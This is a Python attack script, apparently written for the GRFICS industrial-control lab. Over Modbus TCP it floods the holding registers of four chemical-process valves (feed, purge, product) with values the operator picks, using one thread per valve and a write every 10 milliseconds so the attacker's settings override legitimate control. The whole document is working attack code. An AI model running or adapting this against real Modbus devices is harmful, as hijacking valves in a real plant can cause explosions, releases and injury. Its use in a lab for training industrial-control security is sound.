#!/usr/bin/env python3
import sys
import time
import threading
from pymodbus.client import ModbusTcpClient

# Target valve IP addresses in GRFICS
VALVE_IPS = {
    "feed1": "192.168.95.10",
    "feed2": "192.168.95.11",
    "purge": "192.168.95.12",
    "product": "192.168.95.13",
}


def override_valve(name, ip_address, target_value):
    """
    Continuously writes the specified value to one valve.
    """
    print(f"[+] {name}: {ip_address} -> {target_value}")

    client = ModbusTcpClient(ip_address, port=502)

    if not client.connect():
        print(f"[-] Failed to connect to {ip_address}")
        return

    values_to_write = [target_value] * 10

    try:
        while True:
            client.write_registers(
                address=0,
                values=values_to_write
            )
            time.sleep(0.01)

    except KeyboardInterrupt:
        pass

    finally:
        client.close()
        print(f"\n[*] Stopped {name} ({ip_address})")


if __name__ == "__main__":

    if len(sys.argv) != 5:
        print("Usage:")
        print("  python3 modcommandinjection.py <feed1> <feed2> <purge> <product>")
        print()
        print("Example:")
        print("  python3 modcommandinjection.py 0 65535 0 65535")
        sys.exit(1)

    feed1_value = int(sys.argv[1])
    feed2_value = int(sys.argv[2])
    purge_value = int(sys.argv[3])
    product_value = int(sys.argv[4])

    values = {
        "feed1": feed1_value,
        "feed2": feed2_value,
        "purge": purge_value,
        "product": product_value,
    }

    print("[*] Starting Modbus writes:")
    print(f"    Feed 1 : {feed1_value}")
    print(f"    Feed 2 : {feed2_value}")
    print(f"    Purge  : {purge_value}")
    print(f"    Product: {product_value}")

    threads = []

    for name, ip in VALVE_IPS.items():
        t = threading.Thread(
            target=override_valve,
            args=(name, ip, values[name])
        )
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Stopping injection threads...")
